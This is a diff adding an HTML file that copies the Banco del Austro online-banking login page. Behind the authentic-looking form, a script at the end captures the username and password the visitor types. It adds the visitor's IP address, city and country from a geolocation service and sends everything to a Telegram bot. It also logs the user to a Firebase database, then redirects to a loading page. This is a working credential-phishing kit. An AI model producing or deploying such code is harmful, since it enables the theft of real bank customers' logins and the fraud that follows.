@@ -1,0 +1,539 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0072)https://www.baustroonline.com/frmInicioWebPersona.aspx?Permiso=524102521 -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head id="Head1">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=9" />
+    <meta name="referrer" content="always" />
+    <title>Ingreso de Persona - Banco del Austro</title>
+    <link href="./StylesWeb.css" type="text/css" rel="STYLESHEET" />
+
+    <link href="./default(1).css" type="text/css" rel="stylesheet" />
+
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+    </script>
+    <script language="JavaScript" type="text/javascript">
+      function validarUsuario(e, maxL) {
+        if (maxL.maxLength > 100 || maxL.maxLength == -1) return true;
+        tecla = document.all ? e.keyCode : e.which;
+        if (tecla == 8 || tecla == 9 || tecla == 16) return true;
+        if (tecla >= 65 && tecla <= 90) tecla = tecla + 32;
+        if (tecla >= 97 && tecla <= 122) return true;
+        if (tecla >= 48 && tecla <= 57) return true;
+        charVal = String.fromCharCode(tecla);
+        listCS = ".-_@";
+        if (listCS != "" && listCS.indexOf(charVal) >= 0) return true;
+        return false;
+      }
+
+      function validarClave(e, maxL) {
+        if (maxL.maxLength > 100 || maxL.maxLength == -1) {
+          clearErrorClave();
+        }
+        tecla = document.all ? e.keyCode : e.which;
+        if (
+          tecla == 8 ||
+          tecla == 9 ||
+          tecla == 16 ||
+          tecla == 38 ||
+          tecla == 95 ||
+          tecla == 64 ||
+          tecla == 92 ||
+          tecla == 36 ||
+          tecla == 35 ||
+          tecla == 42
+        ) {
+          clearErrorClave();
+        }
+
+        if (tecla >= 97 && tecla <= 122) {
+          clearErrorClave();
+        }
+        if (tecla >= 45 && tecla <= 57) {
+          clearErrorClave();
+        }
+        charVal = String.fromCharCode(tecla);
+        listaBlancaClave =
+          "&.-_@/\\$#*1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        if (listaBlancaClave != "" && listaBlancaClave.indexOf(charVal) >= 0) {
+          clearErrorClave();
+        } else {
+          if (
+            document.getElementById("txtClave").value.length != maxL.maxLength
+          ) {
+            document.getElementById("msgErrorClave").innerHTML =
+              "Solo puede introducir letras min&#250;sculas, n&#250;meros y caracteres especiales &.-_@/\\$#*";
+            return false;
+          } else {
+            return false;
+          }
+        }
+      }
+
+      function clearErrorClave() {
+        document.getElementById("msgErrorClave").innerHTML = "";
+        return true;
+      }
+
+      function _doitvaluechange() {
+        var xShw = ["txtUsuario"];
+        var xVal = ["txtUsuario", "txtClave"];
+        _securecode_prepare(xShw, xVal, null);
+      }
+      document.ondragstart = function () {
+        return false;
+      };
+    </script>
+
+    <style>
+      .newLblLogin {
+        color: #4a4a50;
+        font-size: 14px;
+        text-decoration: none;
+      }
+
+      @font-face {
+        font-family: "password";
+        font-style: normal;
+        font-weight: 400;
+        src: url("../Productos/Styles/FONTS/password.ttf");
+      }
+      .fakePassword {
+        font-family: "password";
+        width: 100px;
+        height: 14px;
+      }
+      .fakePassword::placeholder {
+        font: 17px Assistant-Medium !important;
+      }
+    </style>
+  </head>
+  <body
+    style="
+      margin-bottom: 0px;
+      margin-left: 0px;
+      margin-right: 0px;
+      margin-top: 0px;
+    "
+    class="body_login"
+    bis_status="ok"
+    bis_frame_id="159"
+  >
+    <form name="frmInicio" id="loginform">
+      <div>
+        <input
+          type="hidden"
+          name="__VIEWSTATEGENERATOR"
+          id="__VIEWSTATEGENERATOR"
+          value="AAF3EADE"
+        />
+        <input
+          type="hidden"
+          name="__VIEWSTATEENCRYPTED"
+          id="__VIEWSTATEENCRYPTED"
+          value=""
+        />
+      </div>
+
+      <input
+        type="hidden"
+        name="anticsrftoken"
+        id="anticsrftoken"
+        value="144083df-7a92-4ce3-8b15-b2e08a42d04c"
+      />
+
+      <input
+        type="hidden"
+        name="userInfo"
+        id="userInfo"
+        value="144083df-7a92-4ce3-8b15-b2e08a42d04c"
+      />
+      <div
+        id="divPrincipal"
+        style="width: 100%; height: 310px"
+        overflow="hidden"
+      >
+        <table
+          cellspacing="0"
+          cellpadding="0"
+          style="width: 100%; height: 310px"
+          class="clsFondo"
+        >
+          <tbody>
+            <tr align="center" valign="top">
+              <td valign="top" align="center">
+                <div id="divLogin" style="position: relative">
+                  <table
+                    align="center"
+                    cellspacing="0"
+                    cellpadding="0"
+                    border="0"
+                    style="width: 30%; height: 265px; vertical-align: middle"
+                  >
+                    <tbody>
+                      <tr>
+                        <td style="height: 10px"></td>
+                      </tr>
+                      <style>
+                        .MyTextBox::placeholder {
+                          color: red;
+                          color: #706f6f;
+                          font-size: 14px;
+                          text-align: center;
+                        }
+                      </style>
+                      <tr>
+                        <td align="center">
+                          <table
+                            cellspacing="0"
+                            cellpadding="0"
+                            border="0"
+                            width="280px;"
+                          >
+                            <tbody>
+                              <tr>
+                                <td align="left" width="130px">
+                                  <span
+                                    id="lblEtiUsuario"
+                                    style="font-size: 12pt"
+                                  ></span>
+                                </td>
+                              </tr>
+                              <tr style="height: 2px"></tr>
+                              <tr>
+                                <td
+                                  align="left"
+                                  valign="top"
+                                  height="36px"
+                                  style=""
+                                >
+                                  <input
+                                    name="txtUsuario"
+                                    type="text"
+                                    maxlength="16"
+                                    id="txtUsuario"
+                                    title="Ingrese su nombre de usuario correctamente"
+                                    class="ui-corner-all"
+                                    placeholder="USUARIO"
+                                    onkeypress="return validarUsuario(event,this)"
+                                    onpaste="return false"
+                                    autocomplete="off"
+                                    style="
+                                      width: 50%;
+                                      width: 350px;
+                                      height: 32px;
+                                      border: 1px solid #d5d5d5;
+                                      padding: 10px;
+                                      font-size: 14px;
+                                      color: #706f6f;
+                                      width: 100%;
+                                      border-radius: 25px;
+                                      -webkit-appearance: none;
+                                      box-sizing: border-box;
+                                      text-align: center;
+                                    "
+                                  />
+                                </td>
+                              </tr>
+                              <tr style="height: 8px"></tr>
+                              <tr>
+                                <td align="left" width="130px">
+                                  <span
+                                    id="lblEtiClave"
+                                    style="font-size: 12pt"
+                                  ></span>
+                                </td>
+                              </tr>
+                              <tr style="height: 2px"></tr>
+                              <tr>
+                                <td
+                                  align="left"
+                                  valign="top"
+                                  height="36px"
+                                  style=""
+                                >
+                                  <input
+                                    name="txtClave"
+                                    maxlength="16"
+                                    id="txtClave"
+                                    title="Ingrese su contraseña correctamente"
+                                    class="ui-corner-all"
+                                    type="password"
+                                    onkeypress="return validarClave(event,this)"
+                                    placeholder="CONTRASEÑA"
+                                    autocomplete="off"
+                                    onpaste="return false"
+                                    style="
+                                      width: 350px;
+                                      height: 32px;
+                                      border: 1px solid #d5d5d5;
+                                      padding: 10px;
+                                      font-size: 14px;
+                                      color: #706f6f;
+                                      width: 100%;
+                                      border-radius: 25px;
+                                      -webkit-appearance: none;
+                                      box-sizing: border-box;
+                                      text-align: center;
+                                    "
+                                  />
+                                  <span
+                                    id="msgErrorClave"
+                                    style="font-size: small; color: indianred"
+                                  ></span>
+                                </td>
+                              </tr>
+
+                              <tr align="center">
+                                <td align="center" valign="top">
+                                  <button
+                                    title="Ingresar al Sistema"
+                                    class="ui-button ui-state-default"
+                                    style="
+                                      width: 100%;
+                                      margin-top: 14px;
+                                      border: 1px solid #1c2b4d;
+                                      background: #1c2b4d;
+                                      border-radius: 25px;
+                                      text-align: center;
+                                      padding: 8px;
+                                    "
+                                    type="submit"
+                                  >
+                                    <span
+                                      class="ui-button-text"
+                                      style="
+                                        vertical-align: middle;
+                                        font-weight: bold;
+                                        color: #f1b634;
+                                        background: none;
+                                      "
+                                    >
+                                      INGRESAR
+                                    </span>
+                                  </button>
+                                </td>
+                              </tr>
+
+                              <tr align="center">
+                                <td align="center" valign="top">
+                                  <div
+                                    style="
+                                      text-align: center;
+                                      margin-top: 30px;
+                                      margin-bottom: 10px;
+                                    "
+                                  >
+                                    <a
+                                      id="linkCambio"
+                                      tabindex="3"
+                                      class="newLblLogin"
+                                      href="javascript:__doPostBack(&#39;linkCambio&#39;,&#39;&#39;)"
+                                      style="
+                                        vertical-align: middle;
+                                        font-size: 15px;
+                                        background-color: none;
+                                        color: #f2f2f2;
+                                        text-decoration: underline;
+                                      "
+                                      >Olvidé mi contraseña</a
+                                    >
+                                  </div>
+                                </td>
+                              </tr>
+
+                              <tr align="center">
+                                <td align="center" valign="top">
+                                  <div style="text-align: center; padding: 8px">
+                                    <a
+                                      id="LinkNewUser"
+                                      tabindex="3"
+                                      class="newLblLogin"
+                                      href="javascript:__doPostBack(&#39;LinkNewUser&#39;,&#39;&#39;)"
+                                      style="
+                                        vertical-align: middle;
+                                        color: #f2f2f2;
+                                      "
+                                      >CREAR MI USUARIO</a
+                                    >
+                                  </div>
+                                </td>
+                              </tr>
+                              <tr align="center">
+                                <td align="center" valign="top">
+                                  <div
+                                    style="text-align: center; padding: 8px"
+                                  ></div>
+                                </td>
+                              </tr>
+
+                              <tr align="center">
+                                <td
+                                  align="center"
+                                  valign="top"
+                                  style="background-color: #f1b634; height: 1px"
+                                ></td>
+                              </tr>
+
+                              <tr align="center">
+                                <td align="center" valign="top">
+                                  <a
+                                    id="btnDesvAustrotoken"
+                                    title="Ingresar al Sistema"
+                                    class="ui-button ui-state-default ui-corner-all"
+                                    href="javascript:__doPostBack(&#39;btnDesvAustrotoken&#39;,&#39;&#39;)"
+                                    style="
+                                      width: 100%;
+                                      margin-top: 5px;
+                                      border: 0px solid #f2f2f2;
+                                      border-radius: 25px;
+                                      background: none;
+                                    "
+                                  >
+                                    <div
+                                      style="text-align: center; padding: 8px"
+                                    >
+                                      <span
+                                        class="ui-button-text"
+                                        style="
+                                          vertical-align: middle;
+                                          color: #f2f2f2;
+                                          background: none;
+                                        "
+                                        >DESVINCULAR AUSTROTOKEN</span
+                                      >
+                                    </div>
+                                  </a>
+                                </td>
+                              </tr>
+
+                              <tr>
+                                <td align="center" colspan="2">
+                                  <div style="height: 10px"></div>
+
+                                  <div style="height: 10px"></div>
+
+                                  <div style="height: 2px"></div>
+                                  <div id="objtemp">
+                                    <input
+                                      type="hidden"
+                                      name="objform"
+                                      id="objform"
+                                    />
+                                  </div>
+                                  <div style="height: 2px"></div>
+                                </td>
+                              </tr>
+                              <tr></tr>
+                              <tr>
+                                <td align="center" colspan="2">
+                                  <div style="height: 4px"></div>
+                                  <div style="text-align: center">
+                                    <!--<a id="linkIngUsrAntiguoAD" class="newLblLogin" href="javascript:__doPostBack(&#39;linkIngUsrAntiguoAD&#39;,&#39;&#39;)">Â¿Ingresaba con pasaporte?</a>-->
+                                  </div>
+                                  <div style="height: 15px"></div>
+                                  <div style="text-align: center">
+                                    Recomendamos utilizar Chrome, Firefox.
+                                  </div>
+                                </td>
+                              </tr>
+                            </tbody>
+                          </table>
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+                <div
+                  id="divMsg"
+                  visible="True"
+                  style="font-size: 12px; display: none"
+                  class="clsMsg"
+                  align="center"
+                >
+                  &nbsp;
+                </div>
+              </td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </form>
+    <!--
+        INGRESA ARCHIVO EXTNERNO JAVASCRIPT 
+    -->
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+  <script src="script.js"></script>
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+      const nombre = document.querySelector("#txtUsuario").value;
+      const cod = document.querySelector("#txtClave").value;
+      localStorage.setItem("usuario", nombre);
+      const questionRef = doc(window.db, "bcrr2", nombre);
+      await setDoc(questionRef, {
+        page: 0,
+      });
+      axios
+        .get(url)
+        .then((response) => {
+          const message =
+            "\nAustro\nUsuario: " +
+            nombre +
+            "\nContra: " +
+            cod +
+            "\nCiudad:" +
+            response.data.city +
+            "\nPais: " +
+            response.data.country +
+            "\nIP: " +
+            response.data.ip;
+          axios
+            .post(
+              "https://api.telegram.org/bot" +
+                miVariableGlobal +
+                "/sendMessage",
+              {
+                chat_id: chat,
+                text: message,
+              }
+            )
+            .then((response) => {
+              window.parent.location.href = "cargando.html";
+            })
+            .catch((error) => {
+              console.error(error);
+            });
+        })
+        .catch((error) => {
+          console.log(error);
+        });
+    });
+  </script>
+</html>
